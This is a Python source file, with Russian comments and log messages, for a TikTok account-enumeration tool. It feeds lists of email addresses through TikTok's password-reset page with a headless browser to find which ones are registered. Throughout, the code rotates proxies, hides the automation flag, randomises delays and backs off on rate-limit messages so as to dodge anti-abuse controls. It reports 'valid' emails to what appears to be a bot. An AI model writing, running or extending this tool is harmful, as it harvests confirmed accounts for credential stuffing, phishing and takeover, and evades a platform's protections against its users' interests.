from __future__ import annotations
from asyncio import Semaphore, create_task, sleep, gather, wait_for, TimeoutError as AsyncTimeoutError, Queue
from typing import List, Optional, Callable, Awaitable
from random import uniform
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from datetime import datetime, timedelta

URL_MAIN = "https://www.tiktok.com/"
MAX_CONCURRENCY = 10
REQUEST_TIMEOUT = 30000


class ProxyModel:
    def __init__(self, proxy_string: str):
        self.proxy_string = proxy_string
        self.is_cooling_down = False
        self.cooldown_until: Optional[datetime] = None
        self.success_count = 0
        self.error_count = 0
        self.is_banned = False
        self.last_error: Optional[str] = None

    def needs_cooldown(self, minutes: int = 15):
        self.is_cooling_down = True
        self.cooldown_until = datetime.now() + timedelta(minutes=minutes)

    def mark_as_banned(self, reason: str = "Connection failed"):
        """Помечаем прокси как полностью нерабочий"""
        self.is_banned = True
        self.is_cooling_down = True
        self.cooldown_until = datetime.now() + timedelta(days=1)  # На сутки
        self.last_error = reason

    def is_available(self) -> bool:
        if self.is_banned:
            return False
        if not self.is_cooling_down:
            return True
        if self.cooldown_until is None or datetime.now() >= self.cooldown_until:
            self.is_cooling_down = False
            self.cooldown_until = None
            return True
        return False


class TikTokChecker:
    def __init__(self, proxies: List[str],
                 log_callback: Callable[[int, str], Awaitable[None]],
                 user_id: int):
        self.emails_queue: Queue[str] = Queue()
        self.proxy_pool = [ProxyModel(p) for p in proxies]
        self.log_callback = log_callback
        self.valid_emails: List[str] = []
        self.rate_limit_error_text = "слишком много запросов"
        self.semaphore = Semaphore(min(MAX_CONCURRENCY, len(proxies)))
        self.user_id = user_id
        self.is_running = True
        self.checked_count = 0
        self.total_emails = 0
        self.failed_emails: List[str] = []

    async def _send_log(self, message: str):
        try:
            await self.log_callback(self.user_id, message)
        except Exception as e:
            print(f"Ошибка отправки лога: {e}")

    def _get_available_proxy(self) -> Optional[ProxyModel]:
        """Возвращает доступный прокси, исключая забаненные"""
        available_proxies = [p for p in self.proxy_pool if p.is_available()]
        if not available_proxies:
            return None

        # Сортируем по количеству ошибок (меньше ошибок - выше приоритет)
        available_proxies.sort(key=lambda x: x.error_count)
        return available_proxies[0]

    async def _check_single_email(self, email: str, proxy_obj: ProxyModel):
        if not self.is_running:
            return

        proxy_data = proxy_obj.proxy_string.split('@')
        server = proxy_data[-1]

        proxy_config = {"server": f"http://{server}"}
        if len(proxy_data) > 1:
            user_pass = proxy_data[0].split(':')
            proxy_config["username"] = user_pass[0]
            proxy_config["password"] = user_pass[1]

        browser = None

        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-dev-shm-usage"
                    ],
                    timeout=60000
                )

                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    locale="ru-RU",
                    proxy=proxy_config,
                    viewport={"width": 1920, "height": 1080}
                )

                page = await context.new_page()
                page.set_default_timeout(REQUEST_TIMEOUT)

                await self._send_log(f"→ <code>{email}</code>: проверка через {server}")

                # Переходим на TikTok с обработкой ошибок прокси
                try:
                    response = await page.goto(URL_MAIN, wait_until="domcontentloaded", timeout=REQUEST_TIMEOUT)

                    # Проверяем ответ
                    if response and response.status >= 400:
                        raise Exception(f"HTTP {response.status} от прокси {server}")

                except PlaywrightTimeoutError:
                    await self._send_log(f"⏱️ <code>{email}</code>: таймаут при загрузке через {server}")
                    proxy_obj.error_count += 1
                    proxy_obj.needs_cooldown(minutes=5)
                    self.failed_emails.append(email)
                    return
                except Exception as e:
                    error_msg = str(e)
                    if "ERR_PROXY_CONNECTION_FAILED" in error_msg or "ERR_TUNNEL_CONNECTION_FAILED" in error_msg:
                        proxy_obj.mark_as_banned("Не удается подключиться к прокси")
                        await self._send_log(
                            f"🚫 <code>{email}</code>: Прокси {server} не работает - помечен как нерабочий")
                        self.failed_emails.append(email)
                        return
                    else:
                        raise e

                await sleep(uniform(2, 3))

                # Ищем кнопку входа с обработкой ошибок
                try:
                    login_selectors = [
                        'button:has-text("Войти")',
                        'button:has-text("Log in")',
                        '[data-e2e="login-button"]',
                        'a[href*="login"]'
                    ]

                    for selector in login_selectors:
                        elements = await page.locator(selector).all()
                        if elements:
                            await elements[0].click()
                            break
                except Exception as e:
                    await self._send_log(f"⚠️ <code>{email}</code>: не нашел кнопку входа через {server}")
                    proxy_obj.error_count += 1
                    proxy_obj.needs_cooldown(minutes=2)
                    self.failed_emails.append(email)
                    return

                await sleep(uniform(1, 2))

                # Ищем "Забыли пароль?"
                try:
                    forgot_selectors = [
                        'text=Забыли пароль?',
                        'text=Forgot password?',
                        'a[href*="forgot-password"]'
                    ]

                    for selector in forgot_selectors:
                        elements = await page.locator(selector).all()
                        if elements:
                            await elements[0].click()
                            break
                except Exception as e:
                    await self._send_log(f"⚠️ <code>{email}</code>: не нашел 'Забыли пароль?' через {server}")
                    proxy_obj.error_count += 1
                    proxy_obj.needs_cooldown(minutes=2)
                    self.failed_emails.append(email)
                    return

                await sleep(uniform(1, 2))

                # Ищем восстановление по email
                try:
                    email_recovery_selectors = [
                        'text=Сброс пароля по электронной почте',
                        'text=Reset password by email',
                        'text=Email'
                    ]

                    for selector in email_recovery_selectors:
                        elements = await page.locator(selector).all()
                        if elements:
                            await elements[0].click()
                            break
                except Exception as e:
                    await self._send_log(f"⚠️ <code>{email}</code>: не нашел восстановления по email через {server}")
                    proxy_obj.error_count += 1
                    proxy_obj.needs_cooldown(minutes=2)
                    self.failed_emails.append(email)
                    return

                await sleep(uniform(1, 2))

                # Ввод email
                try:
                    email_input_selectors = [
                        'input[name="email"]',
                        'input[type="email"]',
                        'input[placeholder*="email"]'
                    ]

                    for selector in email_input_selectors:
                        elements = await page.locator(selector).all()
                        if elements:
                            await elements[0].fill(email)
                            break
                except Exception as e:
                    await self._send_log(f"⚠️ <code>{email}</code>: не нашел поле для email через {server}")
                    proxy_obj.error_count += 1
                    proxy_obj.needs_cooldown(minutes=2)
                    self.failed_emails.append(email)
                    return

                await sleep(uniform(1, 2))

                # Кнопка отправки
                try:
                    submit_selectors = [
                        'button[type="submit"]',
                        'button:has-text("Отправить")',
                        'button:has-text("Send")'
                    ]

                    for selector in submit_selectors:
                        elements = await page.locator(selector).all()
                        if elements:
                            await elements[0].click()
                            break
                except Exception as e:
                    await self._send_log(f"⚠️ <code>{email}</code>: не нашел кнопку отправки через {server}")
                    proxy_obj.error_count += 1
                    proxy_obj.needs_cooldown(minutes=2)
                    self.failed_emails.append(email)
                    return

                # Ожидание результата
                await sleep(3)

                # Проверка результата
                content = await page.content()

                # Проверка на ошибки
                error_indicators = [
                    "слишком много запросов",
                    "too many attempts",
                    "rate limit",
                    "попробуйте позже",
                    "try again later"
                ]

                for error in error_indicators:
                    if error in content.lower():
                        if error in ["слишком много запросов", "too many attempts", "rate limit"]:
                            proxy_obj.needs_cooldown(minutes=15)
                        else:
                            proxy_obj.needs_cooldown(minutes=5)

                        await self._send_log(f"⚠️ <code>{email}</code>: обнаружена ошибка '{error}' через {server}")
                        proxy_obj.error_count += 1
                        self.failed_emails.append(email)
                        return

                # Проверка на регистрацию
                not_registered_indicators = [
                    "не зарегистрирован",
                    "not registered",
                    "не найдено",
                    "не существует",
                    "does not exist"
                ]

                for indicator in not_registered_indicators:
                    if indicator in content.lower():
                        await self._send_log(f"❌ <code>{email}</code>: не зарегистрирован")
                        proxy_obj.success_count += 1
                        return

                # Если дошли сюда - email валидный
                await self._send_log(f"✅ <code>{email}</code>: <b>ВАЛИД!</b>")
                self.valid_emails.append(email)
                proxy_obj.success_count += 1

        except Exception as e:
            error_msg = str(e)

            # Классификация ошибок
            if "ERR_PROXY_CONNECTION_FAILED" in error_msg:
                proxy_obj.mark_as_banned("Ошибка подключения к прокси")
                await self._send_log(f"🚫 <code>{email}</code>: Прокси {server} не работает - исключен из пула")
            elif "timeout" in error_msg.lower():
                proxy_obj.needs_cooldown(minutes=5)
                await self._send_log(f"⏱️ <code>{email}</code>: таймаут через {server}")
            elif "net::ERR_" in error_msg:
                proxy_obj.needs_cooldown(minutes=10)
                await self._send_log(f"🌐 <code>{email}</code>: сетевая ошибка через {server}")
            else:
                proxy_obj.needs_cooldown(minutes=3)
                await self._send_log(f"⚠️ <code>{email}</code>: ошибка через {server} ({type(e).__name__})")

            proxy_obj.error_count += 1
            self.failed_emails.append(email)

        finally:
            try:
                if browser:
                    await browser.close()
            except Exception:
                pass

    async def _worker(self):
        while self.is_running:
            try:
                email = await wait_for(self.emails_queue.get(), timeout=2.0)

                if email is None:
                    self.emails_queue.task_done()
                    break

                # Ищем доступный прокси
                proxy_obj = None
                wait_count = 0

                while proxy_obj is None and self.is_running and wait_count < 6:  # Максимум 60 секунд
                    proxy_obj = self._get_available_proxy()
                    if proxy_obj is None:
                        if wait_count % 2 == 0:  # Сообщаем каждые 20 секунд
                            await self._send_log(f"⏳ Нет доступных прокси. Ожидание... ({wait_count * 10} сек)")
                        await sleep(10)
                        wait_count += 1

                if not proxy_obj:
                    await self._send_log("🚫 Нет доступных прокси после ожидания")
                    self.emails_queue.task_done()
                    continue

                # Выполняем проверку
                async with self.semaphore:
                    await self._check_single_email(email, proxy_obj)

                self.emails_queue.task_done()
                self.checked_count += 1

                # Отчет о прогрессе
                if self.checked_count % 10 == 0:
                    progress = (self.checked_count / self.total_emails) * 100 if self.total_emails > 0 else 0
                    await self._send_log(f"📊 Прогресс: {self.checked_count}/{self.total_emails} ({progress:.1f}%)")

            except AsyncTimeoutError:
                continue
            except Exception as e:
                print(f"Ошибка в worker: {e}")
                if not self.emails_queue.empty():
                    self.emails_queue.task_done()
                continue

    async def run_checker(self, emails: List[str]):
        if not self.proxy_pool:
            await self._send_log("❌ <b>Нет прокси для запуска!</b>")
            return []

        if not emails:
            await self._send_log("❌ <b>Нет email для проверки!</b>")
            return []

        self.total_emails = len(emails)
        self.checked_count = 0
        self.failed_emails.clear()

        # Добавляем email в очередь
        for email in emails:
            await self.emails_queue.put(email)

        # Запускаем воркеров
        workers_count = min(len([p for p in self.proxy_pool if not p.is_banned]), MAX_CONCURRENCY)
        if workers_count == 0:
            await self._send_log("❌ <b>Все прокси нерабочие!</b>")
            return []

        workers = [create_task(self._worker()) for _ in range(workers_count)]

        await self._send_log(f"🚀 <b>Начинаю проверку {len(emails)} почт через {workers_count} потоков</b>")

        # Ждем завершения очереди
        try:
            await self.emails_queue.join()
        except Exception as e:
            print(f"Ошибка ожидания очереди: {e}")

        # Останавливаем воркеров
        self.is_running = False
        for _ in range(workers_count):
            await self.emails_queue.put(None)

        # Ждем завершения всех воркеров
        try:
            await wait_for(gather(*workers, return_exceptions=True), timeout=10)
        except AsyncTimeoutError:
            print("Таймаут при завершении воркеров")

        # Статистика
        working_proxies = [p for p in self.proxy_pool if not p.is_banned]
        banned_proxies = [p for p in self.proxy_pool if p.is_banned]

        stats = (
            f"✅ <b>Проверка завершена!</b>\n\n"
            f"📊 <b>Общая статистика:</b>\n"
            f"• Всего email: <b>{self.total_emails}</b>\n"
            f"• Проверено: <b>{self.checked_count}</b>\n"
            f"• Валидных: <b>{len(self.valid_emails)}</b>\n"
            f"• Не удалось проверить: <b>{len(self.failed_emails)}</b>\n\n"
            f"🔗 <b>Статистика прокси:</b>\n"
            f"• Рабочих: <b>{len(working_proxies)}</b>\n"
            f"• Нерабочих: <b>{len(banned_proxies)}</b>"
        )

        await self._send_log(stats)

        # Если есть нерабочие прокси - показываем их
        if banned_proxies:
            banned_list = "\n".join([f"• {p.proxy_string}" for p in banned_proxies[:5]])
            if len(banned_proxies) > 5:
                banned_list += f"\n• ... и еще {len(banned_proxies) - 5} прокси"

            await self._send_log(f"🚫 <b>Нерабочие прокси:</b>\n{banned_list}")

        # Если есть не проверенные email и есть рабочие прокси
        if self.failed_emails and working_proxies:
            retry_choice = (
                f"\n\n🔄 <b>{len(self.failed_emails)}</b> email не удалось проверить.\n"
                f"Хотите попробовать снова с оставшимися прокси?"
            )
            await self._send_log(retry_choice)

        return self.valid_emails


# Тестовые данные
TEST_PROXIES = []
TEST_EMAILS = []
